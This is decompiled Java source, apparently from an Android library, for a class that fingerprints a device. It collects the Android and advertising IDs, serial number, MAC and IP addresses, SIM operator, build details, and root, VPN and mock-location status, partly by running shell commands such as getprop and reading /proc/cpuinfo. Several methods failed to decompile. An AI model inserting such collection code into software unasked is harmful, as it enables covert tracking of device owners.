package com.hawkshaw.library.deviceinfo;

import F3.t;
import W2.h;
import X1.B;
import X2.r;
import X2.w;
import Y1.K;
import a3.e;
import android.app.ActivityManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.Signature;
import android.graphics.Point;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Process;
import android.provider.Settings;
import android.util.Base64;
import android.view.Display;
import android.view.WindowManager;
import c3.C0331i;
import com.hawkshaw.library.App;
import com.hawkshaw.library.BuildConfig;
import com.hawkshaw.library.ktextensions.NumbersKt;
import com.hawkshaw.library.logger.Logger;
import i.C0528x;
import java.net.NetworkInterface;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.List;
import java.util.Map;
import kotlinx.serialization.json.c;
import me.pushy.sdk.config.PushySDK;
import me.pushy.sdk.lib.jackson.databind.deser.std.StdKeyDeserializer;
import t3.N;
import v3.j;

public final class DeviceInfo {
    public static final DeviceInfo INSTANCE = new DeviceInfo();
    private static final String TAG = "DeviceInfo";

    public static final class NIF {
        private final String mac;
        private final String name;

        public NIF(String str, String str2) {
            K.n(str, "name");
            K.n(str2, "mac");
            this.name = str;
            this.mac = str2;
        }

        public final String getMac() {
            return this.mac;
        }

        public final String getName() {
            return this.name;
        }

        public final c toJsonObject() {
            t tVar = new t();
            j.n(tVar, "name", this.name);
            j.n(tVar, "mac", this.mac);
            return new c(tVar.f656a);
        }
    }

    private DeviceInfo() {
    }

    /* access modifiers changed from: private */
    /* JADX WARNING: Removed duplicated region for block: B:14:0x003c  */
    /* JADX WARNING: Removed duplicated region for block: B:23:0x006b A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:24:0x006c A[PHI: r10 
  PHI: (r10v2 java.lang.Object) = (r10v4 java.lang.Object), (r10v5 java.lang.Object), (r10v5 java.lang.Object), (r10v1 java.lang.Object) binds: [B:22:0x0069, B:15:0x0047, B:16:0x0049, B:10:0x0026] A[DONT_GENERATE, DONT_INLINE], RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0022  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public final java.lang.Object getAdvertisingId(android.content.Context r8, int r9, a3.e r10) {
        /*
            r7 = this;
            boolean r0 = r10 instanceof I1.a
            if (r0 == 0) goto L_0x0013
            r0 = r10
            I1.a r0 = (I1.a) r0
            int r1 = r0.f985I
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f985I = r1
            goto L_0x0018
        L_0x0013:
            I1.a r0 = new I1.a
            r0.<init>(r7, r10)
        L_0x0018:
            java.lang.Object r10 = r0.f983G
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f985I
            r3 = 2
            r4 = 1
            if (r2 == 0) goto L_0x003c
            if (r2 == r4) goto L_0x0032
            if (r2 != r3) goto L_0x002a
            Y1.C0110h.P(r10)
            goto L_0x006c
        L_0x002a:
            java.lang.IllegalStateException r8 = new java.lang.IllegalStateException
            java.lang.String r9 = "call to 'resume' before 'invoke' with coroutine"
            r8.<init>(r9)
            throw r8
        L_0x0032:
            int r9 = r0.f982F
            android.content.Context r8 = r0.f981E
            com.hawkshaw.library.deviceinfo.DeviceInfo r2 = r0.f980D
            Y1.C0110h.P(r10)
            goto L_0x005d
        L_0x003c:
            Y1.C0110h.P(r10)
            java.lang.String r10 = ""
            java.lang.String r2 = "NA"
            boolean r2 = Y1.K.f(r10, r2)
            if (r2 == 0) goto L_0x006c
            if (r9 <= 0) goto L_0x006c
            r0.f980D = r7
            r0.f981E = r8
            r0.f982F = r9
            r0.f985I = r4
            r5 = 3000(0xbb8, double:1.482E-320)
            java.lang.Object r10 = Y1.K.C(r5, r0)
            if (r10 != r1) goto L_0x005c
            return r1
        L_0x005c:
            r2 = r7
        L_0x005d:
            int r9 = r9 - r4
            r10 = 0
            r0.f980D = r10
            r0.f981E = r10
            r0.f985I = r3
            java.lang.Object r10 = r2.getAdvertisingId(r8, r9, r0)
            if (r10 != r1) goto L_0x006c
            return r1
        L_0x006c:
            return r10
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.deviceinfo.DeviceInfo.getAdvertisingId(android.content.Context, int, a3.e):java.lang.Object");
    }

    public static /* synthetic */ Object getAdvertisingId$default(DeviceInfo deviceInfo, Context context, int i5, e eVar, int i6, Object obj) {
        if ((i6 & 2) != 0) {
            i5 = 3;
        }
        return deviceInfo.getAdvertisingId(context, i5, eVar);
    }

    private final String getBase64Sha256(byte[] bArr) {
        String encodeToString = Base64.encodeToString(MessageDigest.getInstance("SHA-256").digest(bArr), 2);
        K.m(encodeToString, "encodeToString(...)");
        return encodeToString;
    }

    private final double getBatteryCapacity(Context context) {
        try {
            Object invoke = Class.forName("com.android.internal.os.PowerProfile").getMethod("getBatteryCapacity", new Class[0]).invoke(Class.forName("com.android.internal.os.PowerProfile").getConstructor(new Class[]{Context.class}).newInstance(new Object[]{context}), new Object[0]);
            K.l(invoke, "null cannot be cast to non-null type kotlin.Double");
            return ((Double) invoke).doubleValue();
        } catch (Exception e5) {
            e5.printStackTrace();
            return 0.0d;
        }
    }

    private final Map<String, Object> getBatteryInfo(Context context) {
        Object systemService = context.getSystemService("batterymanager");
        K.l(systemService, "null cannot be cast to non-null type android.os.BatteryManager");
        BatteryManager batteryManager = (BatteryManager) systemService;
        return w.X(new h("battery.capacity_current_percent", Integer.valueOf(batteryManager.getIntProperty(4))), new h("battery.capacity_total", Double.valueOf(getBatteryCapacity(context))), new h("battery.is_charging", Boolean.valueOf(batteryManager.isCharging())));
    }

    private final String getDeviceProps() {
        return runShellCommand("getprop | sed '/init.svc/d' | sed '/vendor.audio/d'");
    }

    public static /* synthetic */ Object getDynamicDeviceInfo$default(DeviceInfo deviceInfo, Context context, e eVar, int i5, Object obj) {
        if ((i5 & 1) != 0) {
            context = App.Companion.getContext();
        }
        return deviceInfo.getDynamicDeviceInfo(context, eVar);
    }

    public static /* synthetic */ c getLoginDeviceInfo$default(DeviceInfo deviceInfo, Context context, int i5, Object obj) {
        if ((i5 & 1) != 0) {
            context = App.Companion.getContext();
        }
        return deviceInfo.getLoginDeviceInfo(context);
    }

    private final List<NIF> getNetworkInterfaceInfo() {
        ArrayList arrayList = new ArrayList();
        try {
            Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
            K.m(networkInterfaces, "getNetworkInterfaces(...)");
            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface nextElement = networkInterfaces.nextElement();
                byte[] hardwareAddress = nextElement.getHardwareAddress();
                if (hardwareAddress != null) {
                    StringBuilder sb = new StringBuilder();
                    int length = hardwareAddress.length;
                    for (int i5 = 0; i5 < length; i5++) {
                        sb.append(String.format("%02X:", Arrays.copyOf(new Object[]{Byte.valueOf(hardwareAddress[i5])}, 1)));
                    }
                    if (sb.length() > 0) {
                        sb.deleteCharAt(sb.length() - 1);
                    }
                    String name = nextElement.getName();
                    K.m(name, "getName(...)");
                    String sb2 = sb.toString();
                    K.m(sb2, "toString(...)");
                    arrayList.add(new NIF(name, sb2));
                }
            }
        } catch (Exception e5) {
            Exception exc = e5;
            Logger.e$default(Logger.INSTANCE, TAG, C0528x.h("getNetworkInterfaceInfo: ", exc.getMessage()), exc, false, 8, (Object) null);
        }
        return arrayList;
    }

    private final Map<String, Object> getRAMInfo(Context context) {
        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
        Object systemService = context.getSystemService("activity");
        K.l(systemService, "null cannot be cast to non-null type android.app.ActivityManager");
        ((ActivityManager) systemService).getMemoryInfo(memoryInfo);
        long j5 = memoryInfo.totalMem;
        long j6 = memoryInfo.availMem;
        return w.X(new h("ram.total_memory", Double.valueOf(NumbersKt.toGB(j5))), new h("ram.available_memory", Double.valueOf(NumbersKt.toGB(j6))), new h("ram.threshold_memory", Double.valueOf(NumbersKt.toGB(memoryInfo.threshold))), new h("ram.is_memory_low", Boolean.valueOf(memoryInfo.lowMemory)), new h("ram.percent_available", Double.valueOf(NumbersKt.roundTo((((float) j6) / ((float) j5)) * ((float) 100), 2))));
    }

    private final String getRestrictBackgroundStatus(ConnectivityManager connectivityManager) {
        int restrictBackgroundStatus = connectivityManager.getRestrictBackgroundStatus();
        return restrictBackgroundStatus != 1 ? restrictBackgroundStatus != 2 ? restrictBackgroundStatus != 3 ? String.valueOf(restrictBackgroundStatus) : "RESTRICT_BACKGROUND_STATUS_ENABLED" : "RESTRICT_BACKGROUND_STATUS_WHITELISTED" : "RESTRICT_BACKGROUND_STATUS_DISABLED";
    }

    public static /* synthetic */ c getStaticDeviceInfo$default(DeviceInfo deviceInfo, Context context, int i5, Object obj) {
        if ((i5 & 1) != 0) {
            context = App.Companion.getContext();
        }
        return deviceInfo.getStaticDeviceInfo(context);
    }

    private final String hasRootCloakingPackages(Context context) {
        return "";
    }

    private final boolean isDevOptionsEnabled(ContentResolver contentResolver) {
        return Settings.Secure.getInt(contentResolver, "development_settings_enabled", 0) != 0;
    }

    private final boolean isMockLocationEnabled(ContentResolver contentResolver) {
        return Settings.Secure.getInt(contentResolver, "mock_location", 0) != 0;
    }

    private final boolean isRooted(Context context) {
        return false;
    }

    private final boolean isVPNConnected(ConnectivityManager connectivityManager) {
        NetworkCapabilities networkCapabilities = connectivityManager.getNetworkCapabilities(connectivityManager.getActiveNetwork());
        return networkCapabilities != null && networkCapabilities.hasTransport(4);
    }

    private final Map<String, Object> networkInfo(ConnectivityManager connectivityManager) {
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        if (activeNetworkInfo == null) {
            return r.f2603D;
        }
        h[] hVarArr = new h[4];
        hVarArr[0] = new h("network.type", activeNetworkInfo.getTypeName());
        hVarArr[1] = new h("network.subtype", activeNetworkInfo.getType() == 1 ? activeNetworkInfo.getTypeName() : INSTANCE.networkTypeClass(activeNetworkInfo.getSubtype()));
        hVarArr[2] = new h("network.subtype_name", activeNetworkInfo.getSubtypeName());
        hVarArr[3] = new h("network.subtype_int", Integer.valueOf(activeNetworkInfo.getSubtype()));
        return w.X(hVarArr);
    }

    private final String networkTypeClass(int i5) {
        if (i5 == 20) {
            return "5G";
        }
        switch (i5) {
            case 1:
            case 2:
            case 4:
            case 7:
            case 11:
            case 16:
                return "2G";
            case 3:
            case 5:
            case 6:
            case 8:
            case 9:
            case 10:
            case 12:
            case StdKeyDeserializer.TYPE_URL /*14*/:
            case StdKeyDeserializer.TYPE_CLASS /*15*/:
            case StdKeyDeserializer.TYPE_BYTE_ARRAY /*17*/:
                return "3G";
            case 13:
                return "4G";
            default:
                return "Unknown";
        }
    }

    private final String runShellCommand(String str) {
        return Shell.INSTANCE.runShellCommand(str);
    }

    public final String getAndroidId() {
        String string = Settings.Secure.getString(App.Companion.getContext().getContentResolver(), "android_id");
        K.m(string, "getString(...)");
        return string;
    }

    /* JADX WARNING: type inference failed for: r1v0, types: [c3.i, i3.p] */
    public final Object getDeviceInfo(e eVar) {
        return B.B(N.f9292c, new C0331i(2, (e) null), eVar);
    }

    /* JADX DEBUG: Multi-variable search result rejected for TypeSearchVarInfo{r1v3, resolved type: java.lang.Object} */
    /* JADX DEBUG: Multi-variable search result rejected for TypeSearchVarInfo{r8v0, resolved type: android.net.ConnectivityManager} */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:13:0x003f  */
    /* JADX WARNING: Removed duplicated region for block: B:20:0x012c A[LOOP:0: B:18:0x0126->B:20:0x012c, LOOP_END] */
    /* JADX WARNING: Removed duplicated region for block: B:24:0x0157 A[LOOP:1: B:22:0x0151->B:24:0x0157, LOOP_END] */
    /* JADX WARNING: Removed duplicated region for block: B:28:0x0183 A[LOOP:2: B:26:0x017d->B:28:0x0183, LOOP_END] */
    /* JADX WARNING: Removed duplicated region for block: B:30:0x019d  */
    /* JADX WARNING: Removed duplicated region for block: B:9:0x0023  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public final java.lang.Object getDynamicDeviceInfo(android.content.Context r11, a3.e r12) {
        /*
            r10 = this;
            boolean r0 = r12 instanceof I1.c
            if (r0 == 0) goto L_0x0014
            r0 = r12
            I1.c r0 = (I1.c) r0
            int r1 = r0.f997M
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0014
            int r1 = r1 - r2
            r0.f997M = r1
        L_0x0012:
            r4 = r0
            goto L_0x001a
        L_0x0014:
            I1.c r0 = new I1.c
            r0.<init>(r10, r12)
            goto L_0x0012
        L_0x001a:
            java.lang.Object r12 = r4.f995K
            b3.a r0 = b3.C0298a.f4140D
            int r1 = r4.f997M
            r2 = 1
            if (r1 == 0) goto L_0x003f
            if (r1 != r2) goto L_0x0037
            F3.t r11 = r4.f994J
            java.lang.String r0 = r4.f993I
            android.net.ConnectivityManager r1 = r4.f992H
            android.content.ContentResolver r2 = r4.f991G
            F3.t r3 = r4.f990F
            F3.t r5 = r4.f989E
            android.content.Context r4 = r4.f988D
            Y1.C0110h.P(r12)
            goto L_0x0084
        L_0x0037:
            java.lang.IllegalStateException r11 = new java.lang.IllegalStateException
            java.lang.String r12 = "call to 'resume' before 'invoke' with coroutine"
            r11.<init>(r12)
            throw r11
        L_0x003f:
            Y1.C0110h.P(r12)
            F3.t r12 = new F3.t
            r12.<init>()
            android.content.ContentResolver r7 = r11.getContentResolver()
            java.lang.Class<android.net.ConnectivityManager> r1 = android.net.ConnectivityManager.class
            java.lang.Object r1 = E.k.getSystemService(r11, r1)
            r8 = r1
            android.net.ConnectivityManager r8 = (android.net.ConnectivityManager) r8
            com.hawkshaw.library.deviceinfo.DeviceInfo r1 = INSTANCE
            java.lang.String r3 = r1.getAndroidId()
            java.lang.String r5 = "android_id"
            v3.j.n(r12, r5, r3)
            r4.f988D = r11
            r4.f989E = r12
            r4.f990F = r12
            r4.f991G = r7
            r4.f992H = r8
            java.lang.String r9 = "advertising_id"
            r4.f993I = r9
            r4.f994J = r12
            r4.f997M = r2
            r5 = 2
            r6 = 0
            r3 = 0
            r2 = r11
            java.lang.Object r1 = getAdvertisingId$default(r1, r2, r3, r4, r5, r6)
            if (r1 != r0) goto L_0x007c
            return r0
        L_0x007c:
            r4 = r11
            r11 = r12
            r3 = r11
            r5 = r3
            r12 = r1
            r2 = r7
            r1 = r8
            r0 = r9
        L_0x0084:
            java.lang.String r12 = (java.lang.String) r12
            v3.j.n(r11, r0, r12)
            int r11 = android.os.Process.myUid()
            java.lang.Integer r12 = new java.lang.Integer
            r12.<init>(r11)
            java.lang.String r11 = "app_uid"
            v3.j.m(r3, r11, r12)
            int r11 = android.os.Process.myPid()
            java.lang.Integer r12 = new java.lang.Integer
            r12.<init>(r11)
            java.lang.String r11 = "app_pid"
            v3.j.m(r3, r11, r12)
            com.hawkshaw.library.deviceinfo.DeviceInfo r11 = INSTANCE
            boolean r12 = r11.isRooted(r4)
            java.lang.Boolean r12 = java.lang.Boolean.valueOf(r12)
            java.lang.String r0 = "is_device_rooted"
            v3.j.l(r3, r0, r12)
            Y1.K.k(r2)
            boolean r12 = r11.isDevOptionsEnabled(r2)
            java.lang.Boolean r12 = java.lang.Boolean.valueOf(r12)
            java.lang.String r0 = "dev_options_enabled"
            v3.j.l(r3, r0, r12)
            boolean r12 = r11.isMockLocationEnabled(r2)
            java.lang.Boolean r12 = java.lang.Boolean.valueOf(r12)
            java.lang.String r0 = "mock_location_enabled"
            v3.j.l(r3, r0, r12)
            java.lang.String r12 = "has_root_cloaking_packages"
            java.lang.String r0 = r11.hasRootCloakingPackages(r4)
            v3.j.n(r3, r12, r0)
            java.lang.String r12 = "getprop gsm.sim.operator.alpha"
            java.lang.String r12 = r11.runShellCommand(r12)
            java.lang.String r0 = "sim_operator"
            v3.j.n(r3, r0, r12)
            java.lang.String r12 = "getprop gsm.sim.operator.numeric"
            java.lang.String r12 = r11.runShellCommand(r12)
            java.lang.String r0 = "sim_operator_numeric"
            v3.j.n(r3, r0, r12)
            java.lang.String r12 = "getprop debug.hwui.force_dark"
            java.lang.String r12 = r11.runShellCommand(r12)
            java.lang.String r0 = "is_force_dark_mode_enabled"
            v3.j.n(r3, r0, r12)
            java.lang.String r12 = "ip route get 1.2.3.4 | grep src| sed 's/.*src \\(.* \\)/\\1/g'| cut -f1 -d ' '"
            java.lang.String r12 = r11.runShellCommand(r12)
            java.lang.String r0 = "ipv4"
            v3.j.n(r3, r0, r12)
            java.lang.String r12 = "ip -6 route get ::FFFF:0102:0304 | grep src| sed 's/.*src \\(.* \\)/\\1/g' | cut -f1 -d ' '"
            java.lang.String r12 = r11.runShellCommand(r12)
            java.lang.String r0 = "ipv6"
            v3.j.n(r3, r0, r12)
            java.util.List r11 = r11.getNetworkInterfaceInfo()
            java.lang.Iterable r11 = (java.lang.Iterable) r11
            java.util.ArrayList r12 = new java.util.ArrayList
            r0 = 10
            int r0 = X2.l.L0(r11, r0)
            r12.<init>(r0)
            java.util.Iterator r11 = r11.iterator()
        L_0x0126:
            boolean r0 = r11.hasNext()
            if (r0 == 0) goto L_0x013a
            java.lang.Object r0 = r11.next()
            com.hawkshaw.library.deviceinfo.DeviceInfo$NIF r0 = (com.hawkshaw.library.deviceinfo.DeviceInfo.NIF) r0
            kotlinx.serialization.json.c r0 = r0.toJsonObject()
            r12.add(r0)
            goto L_0x0126
        L_0x013a:
            kotlinx.serialization.json.b r11 = com.hawkshaw.library.ktextensions.MapKt.toJsonElement(r12)
            java.lang.String r12 = "network_interfaces"
            r3.a(r12, r11)
            com.hawkshaw.library.deviceinfo.DeviceInfo r11 = INSTANCE
            java.util.Map r11 = r11.getRAMInfo(r4)
            java.util.Set r11 = r11.entrySet()
            java.util.Iterator r11 = r11.iterator()
        L_0x0151:
            boolean r12 = r11.hasNext()
            if (r12 == 0) goto L_0x016f
            java.lang.Object r12 = r11.next()
            java.util.Map$Entry r12 = (java.util.Map.Entry) r12
            java.lang.Object r0 = r12.getKey()
            java.lang.String r0 = (java.lang.String) r0
            java.lang.Object r12 = r12.getValue()
            kotlinx.serialization.json.b r12 = com.hawkshaw.library.ktextensions.MapKt.toJsonElement(r12)
            r3.a(r0, r12)
            goto L_0x0151
        L_0x016f:
            com.hawkshaw.library.deviceinfo.DeviceInfo r11 = INSTANCE
            java.util.Map r11 = r11.getBatteryInfo(r4)
            java.util.Set r11 = r11.entrySet()
            java.util.Iterator r11 = r11.iterator()
        L_0x017d:
            boolean r12 = r11.hasNext()
            if (r12 == 0) goto L_0x019b
            java.lang.Object r12 = r11.next()
            java.util.Map$Entry r12 = (java.util.Map.Entry) r12
            java.lang.Object r0 = r12.getKey()
            java.lang.String r0 = (java.lang.String) r0
            java.lang.Object r12 = r12.getValue()
            kotlinx.serialization.json.b r12 = com.hawkshaw.library.ktextensions.MapKt.toJsonElement(r12)
            r3.a(r0, r12)
            goto L_0x017d
        L_0x019b:
            if (r1 == 0) goto L_0x01df
            com.hawkshaw.library.deviceinfo.DeviceInfo r11 = INSTANCE
            boolean r12 = r11.isVPNConnected(r1)
            java.lang.Boolean r12 = java.lang.Boolean.valueOf(r12)
            java.lang.String r0 = "is_vpn_enabled"
            v3.j.l(r3, r0, r12)
            java.lang.String r12 = "battery.optimisation"
            java.lang.String r0 = r11.getRestrictBackgroundStatus(r1)
            v3.j.n(r3, r12, r0)
            java.util.Map r11 = r11.networkInfo(r1)
            java.util.Set r11 = r11.entrySet()
            java.util.Iterator r11 = r11.iterator()
        L_0x01c1:
            boolean r12 = r11.hasNext()
            if (r12 == 0) goto L_0x01df
            java.lang.Object r12 = r11.next()
            java.util.Map$Entry r12 = (java.util.Map.Entry) r12
            java.lang.Object r0 = r12.getKey()
            java.lang.String r0 = (java.lang.String) r0
            java.lang.Object r12 = r12.getValue()
            kotlinx.serialization.json.b r12 = com.hawkshaw.library.ktextensions.MapKt.toJsonElement(r12)
            r3.a(r0, r12)
            goto L_0x01c1
        L_0x01df:
            kotlinx.serialization.json.c r11 = new kotlinx.serialization.json.c
            java.util.LinkedHashMap r12 = r5.f656a
            r11.<init>(r12)
            return r11
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.deviceinfo.DeviceInfo.getDynamicDeviceInfo(android.content.Context, a3.e):java.lang.Object");
    }

    public final c getLoginDeviceInfo(Context context) {
        K.n(context, "context");
        t tVar = new t();
        PackageInfo packageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 64);
        DeviceInfo deviceInfo = INSTANCE;
        j.n(tVar, "android_id", deviceInfo.getAndroidId());
        j.m(tVar, "sdk_int", Integer.valueOf(Build.VERSION.SDK_INT));
        j.n(tVar, "brand", Build.BRAND);
        j.n(tVar, "model", Build.MODEL);
        j.n(tVar, "sim_operator", deviceInfo.runShellCommand("getprop gsm.sim.operator.alpha"));
        String str = null;
        j.m(tVar, "version_code", packageInfo != null ? Integer.valueOf(packageInfo.versionCode) : null);
        if (packageInfo != null) {
            str = packageInfo.packageName;
        }
        j.n(tVar, "package_name", str);
        j.m(tVar, "app_uid", Integer.valueOf(Process.myUid()));
        return new c(tVar.f656a);
    }

    public final c getStaticDeviceInfo(Context context) {
        K.n(context, "context");
        t tVar = new t();
        PackageInfo packageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 64);
        Signature[] signatureArr = packageInfo.signatures;
        K.m(signatureArr, "signatures");
        String str = "";
        for (Signature byteArray : signatureArr) {
            DeviceInfo deviceInfo = INSTANCE;
            byte[] byteArray2 = byteArray.toByteArray();
            K.m(byteArray2, "toByteArray(...)");
            str = deviceInfo.getBase64Sha256(byteArray2);
        }
        j.n(tVar, "platform", PushySDK.PLATFORM_CODE);
        j.n(tVar, "package_name", packageInfo.packageName);
        j.m(tVar, "version_code", Integer.valueOf(packageInfo.versionCode));
        j.n(tVar, "version_name", packageInfo.versionName);
        j.m(tVar, "library_version_code", Integer.valueOf(BuildConfig.VERSION_CODE));
        j.n(tVar, "library_version_name", BuildConfig.VERSION_NAME);
        j.m(tVar, "sdk_int", Integer.valueOf(Build.VERSION.SDK_INT));
        j.n(tVar, "brand", Build.BRAND);
        j.n(tVar, "manufacturer", Build.MANUFACTURER);
        j.n(tVar, "product", Build.PRODUCT);
        j.n(tVar, "model", Build.MODEL);
        j.n(tVar, "device", Build.DEVICE);
        j.n(tVar, "serial", Build.SERIAL);
        j.n(tVar, "display", Build.DISPLAY);
        j.n(tVar, "release", Build.VERSION.RELEASE);
        j.n(tVar, "build_incremental", Build.VERSION.INCREMENTAL);
        j.n(tVar, "build_security_patch", Build.VERSION.SECURITY_PATCH);
        j.n(tVar, "device_board", Build.BOARD);
        j.n(tVar, "build_fingerprint", Build.FINGERPRINT);
        j.n(tVar, "build_host", Build.HOST);
        j.n(tVar, "build_id", Build.ID);
        j.n(tVar, "architecture", System.getProperty("os.arch"));
        j.n(tVar, "UA", System.getProperty("http.agent"));
        j.n(tVar, "os_version", System.getProperty("os.version"));
        j.m(tVar, "cores_number", Integer.valueOf(Runtime.getRuntime().availableProcessors()));
        DeviceInfo deviceInfo2 = INSTANCE;
        j.n(tVar, "vbmeta_digest", deviceInfo2.runShellCommand("getprop ro.boot.vbmeta.digest"));
        j.n(tVar, "cpu_model", deviceInfo2.runShellCommand("awk '/^Hardware/{print $NF}' /proc/cpuinfo"));
        j.n(tVar, "cpu_model_2", deviceInfo2.runShellCommand("cat /proc/cpuinfo | grep 'Hardware' | sed 's/.*\\: //'"));
        j.n(tVar, "sha256", str);
        j.n(tVar, "supported_abis", Arrays.toString(Build.SUPPORTED_ABIS));
        j.m(tVar, "screen_density", Integer.valueOf(context.getResources().getDisplayMetrics().densityDpi));
        Object systemService = context.getSystemService("window");
        K.l(systemService, "null cannot be cast to non-null type android.view.WindowManager");
        Display defaultDisplay = ((WindowManager) systemService).getDefaultDisplay();
        float refreshRate = defaultDisplay.getRefreshRate();
        if (!Float.isNaN(refreshRate)) {
            j.m(tVar, "display_refresh_rate", Integer.valueOf(Math.round(refreshRate)));
            Point point = new Point();
            defaultDisplay.getSize(point);
            j.m(tVar, "display_x", Integer.valueOf(point.x));
            j.m(tVar, "display_y", Integer.valueOf(point.y));
            return new c(tVar.f656a);
        }
        throw new IllegalArgumentException("Cannot round NaN value.");
    }
}
